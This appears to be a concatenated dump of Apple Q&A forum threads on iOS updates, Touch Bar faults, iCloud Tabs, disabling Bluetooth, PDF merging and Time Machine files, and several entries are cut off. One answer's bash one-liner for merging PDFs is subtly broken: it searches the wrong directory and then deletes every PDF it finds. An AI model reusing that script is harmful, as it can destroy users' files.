file called hugefile in your home folder, which you can check the size with Get Info and stop when it's big enough for you, using ControlC. Or you can simply let it run until you are out of space in the disk and things start to stop working.\nThis command takes a long time to allocate the memory, you can also stop it when it's 5~10GB. \nIn practical, what I have done earlier is letting dd run for about 30 seconds, then killing it with ctrl+c, and deleting the file:\nrm ~/hugefile\n\nHope this will help in your case too. Then App Store happily installed the update if it is trying to udpate. \n", "Q: Getting “Unable to Check for Update” error when trying to update to iOS 13.1 I’m currently running iOS 13. When trying to update to iOS 13.1, I get the following error after opening the software update screen:\n\nI’m using an iPhone XS Max. I’ve tried the following without success:\n\n\n*\n\n*Restarting the phone \n\n*Force restarting the phone \n\n*Being on WiFi or cellular \n\n*Resetting the network settings \n\n*Contacting Apple Support via the app (the suggested solution was a force restart)\n\n\nI’ve never encountered this error before, even when I updated to iOS 13 (or even 12) right at the launch time, so I’m suspecting it’s not related to the amount of traffic for a mostly minor update. I’ve also been experiencing this error almost continuously for about 24 hours. \nUnfortunately I don’t have access to a computer with iTunes running to attempt the update with. \nHas anybody else experienced this error and is there a solution?\n\nA: You have done everything that you can do from your iPhone. The solution for you at the moment is to use iTunes from your Mac/PC if you really want to have iOS 13.1.\n\n*\n\n*If you want to update immediately, plug in your iPhone to your Mac\n\n*Update via iTunes by clicking the Check for Software Update button\n\nI got the same issue and with iTunes, I was able to fix it. Sorry, at the moment with my knowledge those basic solutions from the phone don't work and didn't help me. I would love to hear if anyone has fixed via iPhone only.\n\nA: I've encountered the same problem and solved like that way.\nI am using iphone7.\n\n\n*\n\n*Connect internet with cellular.\n\n*Go to .. General → Setting → Software update\n\n*While connecting to the apple server, try cellular internet off and on\nuntil \"Automatic Updates\" option display. (try two to three times above procedure)\n\n*When \"Automatic Updates\" option display, change \"on\" → \"off\".\n\n*Connect internet again and this time ios13.1 update will be displayed.\n\n", "Q: Touch Bar display partly not working My Mac's Touch Bar's display doesn't work near the Touch ID button, and I have no idea why.

I have some iPhones which are connected via USB to a computer 24/7.\nThis set-up drastically reduces the battery life-time: The integrated battery is swelling every 1-2 years in a way that the iPhone nearly disassembles itself (the device has a gap in the middle of more than 5mm so that you can right look into the device and the display is a bit \"curvy\").\nAs the devices nearly constantly are powered via USB the battery I don't care if the battery is charged 50% or 100%. Is there a possibility to limit the maximum charge or is it possible to disable charging on a jailbroken device? \nNote other answers like \"don't charge the device the whole night\" are useless to me as the phones have to be connected via USB 24/7 because the devices are accessed via SSH over USB. And answers that indicate that there is no risk in charging a device 24/7 are obviously wrong as I have multiple devices that continuously get a swelling battery after a certain time if they are connected via USB 24/7.\n\nA: There's really no option in the iPhone to limit it to charging the battery to 50%, or temporarily disable charging.\nHowever, I suggest that you turn the problem around and look at it differently. Namely just stop supplying power to the phone, when you do not want it to charge. You can leave the cable plugged in and have data transfers continually, but just don't supply the +5V for charging.\nThis can be done by plugging the iPhone into a hub that supports per-port power control and then plugging the hub into a computer, where you can use uhubctl to turn on/off ports as you like:\nhttps://github.com/mvp/uhubctl\n", "Q: What are the Apple-provided drivers for the AMD Pro Vega 16/20 for Windows 10?

Prior to updating to Safari 13, iCloud Tabs was a feature that, when turned on and on clicking the tabs button on \"Desktop\" Safari, would show you tabs that were open on other devices at the bottom of the list.\nHere’s how they used to work per Apple's support documentation: https://support.apple.com/en-us/HT202530\nI no longer see this list of tabs.\nAs of this writing, I am running Safari 13.0.1 on 10.14.6.\n\nA: I noticed this problem a while ago, but didn't dig into it until now. I am using iOS 13.3 and trying to get tabs from 10.13.6. \nThe Apple support page clarifies what should work and what will not work:\n\niCloud Tabs works between devices running iOS 13 or iPadOS and macOS\n  Mojave 10.14.4 or later, or between devices running iOS 12 or earlier\n  and macOS Mojave 10.14.3 or earlier.\n\nApple's What's new in the updates for macOS Mojave page does not mention changes that would make things incompatible, but here is a much more detailed break down of the 10.14.4 update.\nSo:\nCatalina & iOS 13 - iCloud Tabs should work\nMojave 10.14.4 & iOS 13 - iCloud Tabs should work\nAny version of macOS less than Mojave 10.14.4 won't work without iOS 13 for iCloud Tabs.\nIf you're running iOS 12, then don't go above Mojave 10.14.3 or you will not have iCloud Tabs anymore. \n\nA: A Reddit user claims Apple support said they won't sync until your Mac is running Catalina.\n\nA: I am in the exact same situation, two iOS 12 devices and a macOS 10.14.6 machine. When running Safari 13.0.2 on my MacBook Pro I cannot see the iCloud tabs of my iOS devices, but the iOS devices can see each other's tabs.\nDownload the Safari Technology Preview, which is version 13.1.2, and I can confirm that the iCloud tabs work again as expected. I can see the Safari tabs that are open on my iOS tabs devices again on my Mac.\nWe'll have to wait until Safari 13.1.2 becomes available.\n\nA: I solved it on my side now so I will propose my solution. \nI used to beta test macOS Catalina on an external SSD connected via T3 to my MacBook Pro. \nNaively, I logged in with my AppleID on that account and turned on all things iCloud.\nFor quite understandable (now) reasons the two logins from the same machine in two different macOSs created a conflict in the sync. \nI booted today from that disk, signed out from my AppleID, saving a copy of the (possibly) not uploaded things to a folder which then I emailed me, and then rebooted into my main disk with Mojave.\nHeaded into System Preferences > iCloud, turned Safari back on and, after a few minutes, everything started working again. \nMaybe you have a similar situation, or even another machine which is just logged in with the same AppleID. \nI hope this sheds some light at least.\n\nA: A work-around: save all open tabs into a bookmark folder; they should miraculously appear in your bookmarks across all the other devices.\nTo save all tabs: If you're on |Safari on iPhone or iPad|, long-click on the bookmarks icon and you will be met with: \"Add Bookmarks for X Tabs.\" If you're on |Safari on Mac|, go to the Bookmarks menu and choose \"Add Bookmarks for These X Tabs...\"\nIf your bookmarks sync nicely, the folder just created will appear across all devices. Good job!\nThe end.\nIf bookmark sync'ing is not happening for you, go for the longer work-around detailed below.\nLonger work-around: copy contents of the newly-created, saved-tabs bookmark folder onto the clipboard. Now paste the urls into a note in the notes app (that should sync easily).\nTo copy the tabs from |Safari on iPhone or iPad| to |Safari on Mac|: navigate to the bookmarks folder that you just created and long-click on it. Now choose \"Copy Contents.\" Lo and behold, the urls of the tabs are now in the clipboard.\nNote: I don't know how to copy a bookmark folder to clipboard on |Safari on Mac|.\n", "Q: Permanently Disable Bluetooth on MacMini 2019 I realize this was asked back in 2014 with this question, but hardware and software has changed a lot over the last 5 years. \nHere's the specifics of my situation:\n\n\n*\n\n*We haven't purchased the device yet, that is contingent on the answer to this question, essentially.\n\n*We are looking at putting a Mac Mini into an environment that requires we disable all wireless communications to/from the device.\n\n*Our devices have firmware passwords and FileVault 2 enabled.\n\n*Apple activates Bluetooth automatically on all devices before the drive is unlocked to ensure users can connect a Bluetooth keyboard to unlock the drive.\n\n*We need to prevent the Bluetooth from ever coming on in the environment we want to put it in.\n\n\nHere's the million $ question: Is there any way to prevent Bluetooth from ever coming on, even before the drive is unlocked and policies are enforced?\nIn a dream world, we would just order a model without a BT card at all, but I don't know how feasible that is. \nEDIT---\nTo clarify, this is going into a government facility that doesn't allow wireless signals at any point. So unfortunately we can't just ignore the signal and get wired devices.\nWe've talked about Faraday cages, but aren't confident they'll get approved since someone would only need to remove the cage.\nRight now the closest solution we've come to, is removing the card, but they are soldered to the board. We're not sure if removing the antenna would work. I've got at least one report that someone was able to connect still, albeit from very close. \nEDIT 2---\nI forgot to mention that in an ideal situation, it would not void the warranty. But I wouldn't be surprised if that was a bridge too far.\n\nA: The most foolproof way of doing this is simply to disconnect the physical antennas. Then no matter what kind of firmware updates, operating system updates, reboots, or whatever happens - it's not going to enable itself again.\nYou can follow the guide for disassembling at from iFixIt:\nhttps://www.ifixit.com/Teardown/Mac+mini+Late+2018+Teardown/115210\nIn step 7, you'll see that the antenna connectors are located on the main board just below the speaker assembly.\n\nBy the way: From the sound of your question, I could guess that you're wanting to place the Mac Mini in a data center that forbids the use of wireless devices. In my experience, these places are not so restrictive that you need to actually go through with this. Their rules just mean that you're not allowed to use WiFi/Bluetooth for actual data transfers in the data centers. It doesn't mean that if the Bluetooth antenna is powered up for 30 seconds during a FileVault boot, that they'll sue you for breach of contract. Perhaps try asking them how seriously you need to take that requirement.\nEDIT: You have updated your question to say that you wanted to remove the Bluetooth card, and preferably doing so without voiding warranty. That is definitely not possible.\nThe \"card\" is not a card - Bluetooth is implemented as a soldered on module from muRata containing not only Bluetooth radios, but also the WiFi radios.\nIt seems like your requirements for hardware doesn't really fit a Mac Mini at all - so perhaps you should look at buying a different computer instead?\nOr you could consider changing the default Apple software. For example you could run Linux instead of macOS on the Mac Mini - where Bluetooth as far as I know is not supported (and if it is, it is easy to disable). This also would mean that you would no longer be using FileVault 2, and so that part of the problem would go away. At that point you might as well buy different hardware since you haven't got a computer yet.\n\nA: We have the same issue with a number of Mac Pro 2019 7,1 where we must disable bluetooth and all wifi/wireless. Since we have not figured out how to remove the physical chips since they are soldered on we have done this instead with a multilayered solution with fallback in case one fails. We have found with mac updates that yes everything you did can be undone and suddenly a deleted .kext file comes back and suddenly wireless or cameras turn on.\n\n\n*\n\n*As described here https://discussions.apple.com/thread/2619301?answerId=22250717022#22250717022 defaults write /Library/Preferences/com.apple.Bluetooth.plist ControllerPowerState 0\nthis sets bluetooth pref to off\n\n*Boot into Recovery mode (offsite or inside of a Faraday protected room or cage or tent - https://mosequipment.com/collections/frontpage makes some that while expensive you can operate out of temporarily.  In Recovery mode there are *.kext files you can delete What Kernel extensions should be deleted to disable bluetooth?  \n\n*Remove and disconnect physically all the antennas from the board (for the Mac Pro 2019 you can see them on step 14 https://www.ifixit.com/Teardown/Mac+Pro+2019+Teardown/128922#s253358  ) \n\n*We found wireless signals still leak with the antennas removed so then you can further mitigate this by using faraday tape, combined with faraday cloth.  The cloth can be wrapped around the wireless components and then the tape is sticky to seal the holes and gaps. It will need many layers to be effective.  \n\n\nWe are still seeking and open to a better solution though. \n", "Q: iOS no longer suggesting passwords I’m running iOS 12 on an iPhone 6 and Safari no longer gives an auto-suggested password when creating new online accounts. \nAm I misremembering that this feature existed at one point or is there some new way to access this feature or otherwise turn Safari suggested passwords back on?\n\nA: If the Strong Passwords suggestion isn’t showing up, it means you don’t have iCloud Keychain enabled.\nGo to Settings -> Accounts & Passwords -> AutoFill Passwords and enable iCloud Keychain.\n", "Q: Identifying iPhone GPS issues I own an iPhone X, purchased a few months after its release (November 2017).  I'm getting close to the end of my AppleCare+ window, and as such have some urgency to identifying whether the following issue is legitimate (and needs to be/can be fixed) or not.  I'm not looking for support for the issue itself, but for how to identify/troubleshoot it.\nThe last few days, my GPS location accuracy has been ... bad.  Very bad.  I was driving home on Sunday, and asked Siri for directions out of the strip mall I was having lunch in back to the highway; Siri started telling me things that made no sense, multiple different sets of things, and was very far off track (and moving about wildly).  My wife, who also has an iPhone X purchased at the same time on the same service, set up her directions and had no issues with drift. \nThe rest of the trip home I continued to experience far more frequent \"course  corrections\" (while I was driving along a deserted freeway) than is typical - tens of corrections, even in fairly open areas, as opposed to the typical two or three.  My wife's phone had nearly no issues.\nI also play some location-aware games, and have had multiple instances where they were far, far worse than usual.  I'm familiar with normal GPS drift, but this seems different.\nIs there any way for me to identify this as an actual problem (as opposed to just normal GPS drift that I'm just noticing more for whatever reason)?  An app, a log, something like that where I can either diagnose the problem or collect data on the problem so I can 1) prove if this is a problem or not, and 2) show it to Apple support so they can identify the (hardware/software) problem?\nIf it's relevant, the issues occurred on iOS 12.4 and iOS 13.0 (but I've since upgraded to 13.1).  Never on a beta, always on release versions.\n\nA: The best bet is to take it into an Apple Store and have them run diagnostics on the device. This won't take long to do, and there'll also be a record of it on their systems.\nIf an Apple Store (or authorised repairer) is not convenient to you, Apple can also run diagnostics while you're on the phone to them.\nRegardless, the diagnostics will identify any hardware related issues on your iPhone and that's really the best way to troubleshoot it. \n", "Q: How to combine multiple pdf files based on location and name with command line? I have multiple folders with this structure:\nFolder Name/ tmp\nOther Folder name/tmp\nand so on...\nInside tmp folder I have many pdf files with this name pattern:\npdf-name-1.pdf\npdf-name-2.pdf\n.... and more\nI’m looking for the way to joint all pdf files inside All tmp directories with this name structure, move original PDFs to trash and rename combined pdf with pdf-name.pdf\nIs there any way to do it using command line or bash script in macOS?\nThan you very much.\nUPDATE FOR CLARIFICATION\nI need to combine all PDFs inside its own tmp folder not All PDFs inside ALL tmp folders.\n\nA: Although you specifically asked for bash script but as a supplemental answer you could consider using the python script below. Interestingly, a part of python project (Ipython) was specifically designed to replace bash.\nfrom PyPDF2 import PdfFileMerger\nimport os \n\n\n\ndef merge_it(files,path):\n    merger = PdfFileMerger()\n    for file in files:\n        merger.append(file)\n\n    merger.write(os.path.join(path,\"combined_file.pdf\"))\n    merger.close()\n\n\nfor path, dirs, files in os.walk(os.getcwd()):\n    for dir in dirs:\n        if dir == 'tmp':\n\n            pdf_files = []\n            for file in os.listdir(os.path.join(path,dir)):\n                if file.endswith(\".pdf\"):\n                    pdf_files.append(os.path.join(path,dir, file))\n            merge_it(pdf_files,os.path.join(path,dir))\n\n\nThe thing this program demands is to hard-code the paths containing /tmp sub-folders. That can also be automated depending on how much automation you want. I won't recommend removing original pdfs unless they are occupying too much space. \nUPDATE: Searches for all sub-folders having name 'tmp' in the current working directory and combines all pdf files inside each of the tmp folder. \n\nA: Apparently /System/Library/Automator/Combine PDF Pages.action/Contents/Resources/join.py is a native tool on Mac to combine multiple PDF files. If that doesn't quite do what you want, you'll need to install some additional software to handle that part. Look at Imagemagick, Graphicsmagick, or pdfjam for that. I'm sure there's many others.\nFor the script part, you can do it all with a one-liner (shown broken up here for simplicity, but you can put it all on one-line):\nfor tmpdir in $(find . -type d -name \"tmp\"); do \n    list_of_files_to_combine=$(find . -name \"*.pdf\") && echo \"Combining pdf files in $d\" && some_pdf_combiner_tool $list_of_files_to_combine pdf-name.pdf && rm $list_of_files_to_combine;\ndone\n\nReplace some_pdf_combiner_tool with the name of whatever tool you chose above.\nI recommend testing this thoroughly to ensure the combining worked before deleting the original pdf files.\nNote also that rm from the Terminal is going to just delete the files directly, not put them in the Trash for possible later retrieval.

Apple used to be relaxed about this and ... although not recomended ...noone really said anything, but now Apple is really cracking down on this. With this risk in mind, my dev team and I are trying get the respective clients to enroll themselves (with our guidance) with a new Enterprise license for themselves. The client would fully own the license themselves, and just add my Tech lead and myself as developers to the group. However, this process has not been successful. \nI am just curious what others experience has been? Others in this forum that are mobile app contractors must be impacted by this as well, and proactively investigating contingency plans. Are you getting your clients to purchase their own Enterprise licenses, or are you going down this Apple Business Manager Path? As I mentioned above, we have tried getting one of our clients to enroll for an Enterprise license for their internal employees, but it seems the mere mention that a 3rd party contractor is building them an app, raises alarm bells for Apple and they instantly reject the client’s application. I suspect that this same negative result will come from all our client’s requests.\nIn short, I am curious how others are handling this dilemma, and what has your success has been moving clients to use Apple’s new Business Manager?\n\nA: Apple did not make drastic changes to the Enterprise program at WWDC19. I don't know where you have that from. The only change I can think of is that they changed their terms to include that they can review internal apps - i.e. they want to be able to check your apps in case of suspicion of malware, bad practices, etc. This is a natural development when taking into account that there recently has been several public cases of companies misusing the enterprise program - breaking the rules - to install apps that are malicious or deceitful to customers.\nYou seem to be convinced that your situation is similar to the majority of other app developers out there - but that isn't the case. The majority of app developers, as far as I can tell, are playing by the rules.\nIt has always been totally clear that enterprise distribution is for distributing apps to your own employees. Not to customers.

I am comparing on macOS El Capitan via diff -r a directory with a the corresponding directory of a time machine snapshot (Note: the backup is made under macOS High Sierra.)\ndiff reports a few files which are only present on the backup: The filenames all start with\n.com.apple.backupd.mdmv\n\n(followed by some numbers). The files are XML text files.\nI searched for these files via Google, but couldn't find much about them (the only (weak) reference I found was \"MDM\" - Apple's Mobile Device Management - But I though this is just an iOS thing).\nWhich tool creates these files and why? Also, I assume I can ignore these files when checking the backup - is this correct?\n\nA: They're generated by backupd which is the main process for Time Machine for handling backups. The files themselves track items that have been moved or renamed, to prevent them from being backed up multiple times, and to track a file's history no matter how much you move it around.\nI can't find a reference to what mdmv stands for exactly, but I'm confident it has nothing to do with Mobile Device Management; my best guess would be that it stands for something like \"MetaData MoVed\", rather than a proper acronym.\nAs for the file's content, it's actually fairly straightforward. For example:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n        <key>DateStarted</key>\n        <date>2020-07-09T21:00:07Z</date>\n        <key>FileID</key>\n        <integer>174035141</integer>\n        <key>NameSpaceID</key>\n        <integer>2140396991</integer>\n        <key>NewPath</key>\n        <string>Movies/TV/TV Shows/Vikings/Season 5/02 The Departed.mp4</string>\n        <key>SourcePath</key>\n        <string>Movies/TV/TV Shows/Vikings/Season 5/2 The Departed.mp4</string>\n</dict>\n</plist>\n\nThis has the following important elements:\n\n*\n\n*DateStarted: Appears to be the time that the move was detected (presumably by fseventsd which is the process that tracks file system events)\n\n*FileID: Seems to be a unique ID for a file, it doesn't appear to be an inode number so is likely specific to Time Machine.\n\n*NewPath: This is the current location of the file, or at least where the file was located the last time that Time Machine was run.\n\n*SourcePath: This is where the file was previously located, probably in reference to its location when Time Machine ran before last.\n\nIn this example, I have an episode from the TV Show Vikings which was stored under the name 2 Departed.mp4 but was renamed (by consolidating my library in TV.app) to 02 Departed.mp4.\nWhen Time Machine was new, this would have been enough for it to see 02 Departed.mp4 as an all-new file and create a full new copy, wasting a load of space on my Time Machine disk, however over the years Time Machine has gotten a bit smarter and no longer does that.\nI'd actually never encountered these specific mdmv files myself until today, which is how I found your question, but Time Machine has had an \"events database\" for a while now which also seems to track these kinds of changes, if you look at hidden files inside a backup directory (e.g- /Volumes/Backup/Backups.backupdb/My Mac/Latest) then you'll find one or more .eventdb files, and probably a .clonedb if any of your volumes are using APFS (they probably are if you're on macOS Mojave or later).\nAt a guess I expect these mdmv files are a finer-grained alternative so Time Machine doesn't have to trawl through events to figure out where a file came from. You should only see them within your Time Machine volume and nowhere else, though if you copy entire folders out of Time Machine from the Finder you may end up copying these as well by accident.\n", "Q: Can we add formula (tool) in brew list?

I change the volume a lot when watching youtube videos. This makes the Touch Bar lag and then crash. \nThis has been a major issue since I was listening to songs through iTunes and the Touch Bar lagged off while I was changing the volume. Just to try to get it to respond I tried increasing it the max and min. The volume throttle didn't move so I assumed it wasn't responding. But after about 2 minutes music was played at full volume.\nIs there any way I can reset the Touch Bar just like I have the ability to reset NVRAM. I am aware that the touch bar is totally controlled by T2 chip. So I think resetting the T2 chip will most probably solve the issue.\n\nA: I’ve had issues with my touch bar too. (See Touch Bar not turning on after waking computer from sleep.)\nHere are some things that didn’t work for me, but they might work for you:\n\n\n*\n\n*Open Activity Monitor, find and select TouchBarServer, then press the Stop button.

I'm on macOS Mojave, Mail is version 12.4.\nProblem\nI've just realized that cmd + delete is deleting (ie irretrievably removing from my machine and server) my emails instead of moving them to the trash. I want my emails to go to the trash so I can recover them later if needed. I would like to change the behavior of that keyboard shortcut, but I doubt that's possible on macOS so I'd settle for adding a new shortcut. However, I can't figure out how to do that.\nWhat I've tried\nI've tried changing the mailbox behavior, which is what others have suggested, but there doesn't seem to be an option (see screenshot below).

I need to disable Find My iPhone function for the period of repair at Apple's authorized repair partner (which will last several days).\nCan it impose any security risks to the on-device data and/or the accounts I logged into with the device?\n\nI am not asked to disclose iOS passcode; I will disable FaceID unlock; all lockscreen features (entire Settings > FaceID > Allow Access when Locked section).\nWhat else should I consider configuring? What risks can still remain?\n\nA: The security risk you endure is that you won't be able to trace the device location, and use the functionality in Find My iPhone for erasing the device, adding a message and giving off sound. \nIn addition it is possible for others to format the device and start using it with a different Apple-ID. However this is not a risk to the confidentiality your data or your accounts - they would need to do a factory reset (i.e. delete everything from the phone) before doing this.\nI would advise backing up the unit before handing it over for repairs at the very least. If you want absolute safety, make sure that your phone is completely emptied before sending it. You do that from Settings > General > Reset > Erase all content and settings. \nAssuming that you trust the repair partner to not steal your iPhone, I would say that the only real risk associated here is what happens if someone breaks in and steals your iPhone from the repair partner's premises. In this case your data is not anymore at risk than it was before, but because you have disabled Find My iPhone - you cannot track your phone, and it can be repurposed for a different user.\n\nA: Find My iPhone Activation Lock was introduced in iOS 7 as a way of preventing stolen devices from being reused by later purchasers. But as far as security risks, Apple (let alone anyone else) cannot re-install the iOS operating system with the Find My iPhone Activation Lock enabled. Also even after that, it has to be \"Activated\". This involves a secure connection to Apple servers to be established which allows Apple to determine the physical device identity, and to see if that device is associated with a certain Apple ID (and such association is applied by enabling Find My iPhone) or not.\nIf Apple has to replace your device with a different one, it makes good sense to disable Find My iPhone before taking the device from you. This allows them to recycle the device (especially the mainboard) if they replace your device. Also, it allows them to provide that new replacement a similar serial number compared to your current device without Find My iPhone preventing them from inactivating your device from their system. With Find My iPhone enabled your device becomes blocked on the Apple servers and the repair chain that it becomes a part of gets broke. With Find My iPhone off it allows the new device (the replacement) to re-enroll for activation under any account. \nAs for your data, erasing the iPhone can fix that. If your Apple Account is using two-factor authentification, you should have a list of trusted numbers and trusted devices. As long as you have access to all of those devices and that number, not even Apple or law enforcement can gain access to your account.\nEven if they erase your iPhone the system won't allow the device to be used by Apple or another user with the Find My iPhone activation lock enabled. Without the original owner's login details it becomes an expensive brick. \nThis is why stealing someone's device isn't worth the trouble because unless you know the account login, you can never use the device.\nHope this answers your questions.\n", "Q: Switched carriers after ordering iPhone 11 I ordered the iPhone 11 with Verizon on the day it came out, and a few days later my family switched from Verizon to T-Mobile. When I'm setting up my phone, it's still trying to activate with Verizon, even when I switch the SIM out for my T-Mobile SIM. How do I resolve this problem?\nEdit: I forgot to that this was ordered as part of the iPhone Upgrade Program with Apple, which says that the phone should be unlocked.\n\nA: Make sure your iPhone is unlocked from Verizon. Make sure that they remove your IMEI number from the account. Verizon can unlock the device, but if you haven't paid it off they wont.\n\nA: Your Verizon supplied phone is subject to a Verizon plan and SIM card. It's useless on a T-Mobile plan and SIM card, and you'll probably find that you're required to keep paying for your Verizon plan as ordering the phone will have extended that plan for several years.\nVerizon may offer you to pay the entire retail price of the phone in exchange for unlocking it, or allow you to return the phone to them at a penalty restocking fee.\n", "Q: iPhone XR not seeing iOS 13.1 update I know roll-outs are staggered, but 10 days (and two minor releases) later I'm fairly sure I should have been offered an update (all other iOS/iPadOS devices in the house have been). \nI've restarted the phone, logged on to various networks (plus cellular), and I'm still seeing \n\niOS 13.0\n  Your software is up to date.\n\nWhen visiting Settings / General / Software Update\nAutomatic updates are On, iCloud setup is fine (backups working, etc.), and this phone is not enrolled in any betas.

If you upgrade your reminders on your iPhone with iOS 13, your iPad and Mac using the same iCloud account can’t access your reminders until iPadOS and macOS 10.15 Catalina are available.\n\nYou will need to wait until you upgrade your Mac to Catalina before Reminders start to sync to your Mac again.\n", "Q: App is not being found on IOS store I'm attempting to install the app 'Working Copy - Git client' on my iPad (app link : https://apps.apple.com/us/app/working-copy/id896694807#?platform=ipad) here is a screenshot of the app : \n\nHowever when I search for the app on the iPad app store it's not being found : \n\nI've tried setting the filter to \"iPad Only\" and \"iPhone Only\" but its still not being found.

But I want to change the sending out \"wooooo\" sound too.\nHow can I go about doing this?\n\nA: iMessage sounds are located at \n/Applications/Messages.app/Contents/Resources/Received Message.aiff\n/Applications/Messages.app/Contents/Resources/Sent Message.aiff\n/Applications/Messages.app/Contents/Resources/Default.aiff\n\nHowever, changing these files do not seem to affect the sound.\n\nA: Perhaps you can do it with this:\nIn Mail->Preferences->Rules (the rules menu of Mail), there is a possibility have sounds in setting a rule.\n", "Q: Photos App does not show in search I have an iPhone 7 and the Photos App is on my phone and it works just fine, but I have a few issues with it: \n1) When I search for it in the iOS search tool, it does not show up. \n2) There are photos that will not open on other devices and cannot be shared any other way. The other devices will read them as corrupt or unreadable. \nI have tried restoring my phone and then restoring it from backup, and I have the exact same issues. I also had this issue in both iOS 12 and 13. My phone is currently up-to-date (As of September 26, 2019, iOS v13.1) because I have been trying to fix this issue. \n\nA: Spotlight uses a system process to index all files on the storage, so if you have a corrupt search or the process is crashing, the only true fix is to back up the device and erase/reinstall it if it's not a setting you can toggle.\nThat setting would be in the settings app - navigate to Siri & Search and then below the main settings is an alphabetical list of apps.\n\nToggle off all the photos items and then power down the phone. Then power it up and navigate back to re-enable them.\n\nIf after 30 minutes on charge, the index isn't working you'll want to prepare to erase and wipe the device.\nIf you are hesitant to do that (since you have to unync an Apple watch - get your health data on the iOS device - then back that up securely, then wipe and restore and then set up things like wallet, fingerprint if the restore doesn't work perfectly) you might try some other things.\n\n\n*\n\n*Reset all settings on the iOS device\n\n*Consider asking Apple Care if there's anything else we missed or a known issue in your version of iOS. \n\n\nIf the version of iOS you're running has a bug, no amount of fiddling will fix that and you'll have to wait for a patch to apply.\n\nA: Are your photos syncing to iCloud?\nTo make sure try checking www.icloud.com and see if those photos and their total amount matches whats on your phone.\nIf so, try to restore your phone again, but set it up as new, without a backup.\nPerhaps the backup is causing some issues with the software.\n", "Q: Can’t backup to iTunes So we have an old 6 running 12.4.1 we want to get a backup for so we can restore to a new phone.

We really just need pics and iMessage restored. Can something like imaging do that?  But the new phone will have 13 on it - can something like imaging work across versions?\n\nA: You need to make sure that iTunes is up to date. If using a Mac, then your Mac needs to be updated in order for iTunes to update.\nOnce its updated then you should be able to backup. \nKeep in mind, iCloud can also be used to backup your iPhone as well.\n\nA: I got it to work by trying the device to device transfer again - first time didn’t work with some appleID error \n", "Q: Why is SSH key different for user@ipaddress vs user@devicename.local (same device) if i ssh into a device (linux) on my local network using user@ipaddress vs user@devicename.local it seems as though my computer (OSX) is treated as two different devices. \nI have noticed some inconsistencies with how the firewall on the device (linux) treats my machine and i am just trying to understand the logic\n\nA: I think you have it backwards - it is not your computer that is treated as two different devices, rather it is the Linux device that is treated as two different devices.\nThe first time you connect to 111.222.333.444, the SSH (host) key of the Linux device is saved on your computer (usually in the ~/.ssh/known_hosts file). This makes it possible for SSH to check that the key is the same the next time you connect - otherwise you'll get a warning that something is up.\nSimilarly, the first time you connect to devicename.local, the key is again saved. SSH doesn't know that 111.222.333.444 and devicename.local is actually the same computer, so the key will be saved twice under different names on your computer.\nTherefore in the future if you update one key and not the other, you'll experience different behaviour regarding host key warnings when you connect via the IP address or the host name.\nRegarding the inconsistencies with your firewall - it is not entirely clear, how you think that is related to your question about the SSH keys being different. In general, a firewall on the server has no way of knowing whether you have opened the connection by typing in the IP address or host name of the server. That information is simply not transferred over the network.\nIf you observe a difference, it is because the host name does not translate to the same IP address as the one, you're entering manually. This can happen if the server has multiple alias IP addresses, and you're using two of those - or if the server has both an IPv4 address and an IPv6 address, and you're typing one and using a host name that is set to the other.\n", "Q: Apple watch series 3 microphone stops working after watch OS 6 update After the watch OS 6 update, I can on longer use Siri with the watch or use it to call. It seems like the watch is not able to record any voice. \nI have already unpair and pair numerous time. I have also restarted the watch. All in vain.\nHow can I fix this issue?\n\nA: iOS update seems to be related. The phone is an iPhone 11.\niOS 13 - Killed both speaker and microphone (e.g. The Micky watch face stops announcing time; the face time counterparty cannot hear what is spoken to the watch; Siri cannot get user's voice command)\niOS 13.1 - Speaker works again (The Micky watch face can announce the time).

Doesn't matter if I search for name, address, subject ecc... always the same problem.\nI have synched two gmail mailboxes with IMAP configuration, nothing very special, but it's very frustrating and annoying. Any suggestion?\nThanks \n\nA: If you don’t get expected results when you search for email messages in the Mail app  on your Mac, try these suggestions.\n\n\n*\n\n*If a specific mailbox is selected in the Favorites bar, Mail searches only that mailbox. To search all mailboxes instead, click All.\n\n*Mail may not be looking in the Trash or Junk mailboxes or searching encrypted messages. To include them when searching all mailboxes, choose Mail > Preferences, click General, then select the options.\n\n*You may need to sync the mailboxes on your Mac with those on the mail server. Choose Mailbox > Synchronize > [account].\n\n*The Mail folder (located in your home Library folder) may be excluded from Spotlight searching. To check, choose Apple menu  > System Preferences, click Spotlight, then click Privacy.\n\n*This solution can take quite some time because all messages will be deleted from your Mac. Therefore, it’s wise to try the other methods first if your mailbox is particularly large. To rebuild a mailbox, proceed as follows: \nIn Mail, select the desired Mailbox from the left-hand panel.\nFrom the Mailbox menu, choose Rebuild.\n", "Q: Can a lightning cable plug get short circuited by a metal surface? I have a couple of lightning connectors on a flat surface, ready to plug into an iPhone or iPad for charging. At the same time, a Macbook or iPad is sometimes placed near that surface.\nCan the body of the Macbook or iPad actually short circuit the lightning connector? (since their 4 pins are exposed), and have potential fire hazard at the adapter if it is the official Apple adapter or the popular Anker brand?\n\nA: I do not think that that can happen: when you look carefully at the lightning connector you will see that the metal body of your mac will touch the upperside of the lightning connector which is one band only and not one of the contacts that are on the sides.\n", "Q: Why there is no \"internal microphone\" in my QuickTime player screen recoding audio source? I have 3 macs, 2 of them are fine but one of it doesn't have the Internal Microphone recording option in Quick Time Player. Only the other 2 have.\nHow can I fix this?\nThe MacOS are all 10.14.3 Mojave and the Mac is Mid 2015. The other two are 2018 and 2017.\n\nA: If the microphone is not listed as an Input device in System Prefs, then that's a larger problem than just QuickTime Player: the OS can't access the mic at all. \nAssuming you've turned the Mac off and on already, you could try resetting the NVRAM.\nYou might see whether updating to Mojave 10.14.6 improves matters.\nBeyond that, it's likely to be a hardware issue.

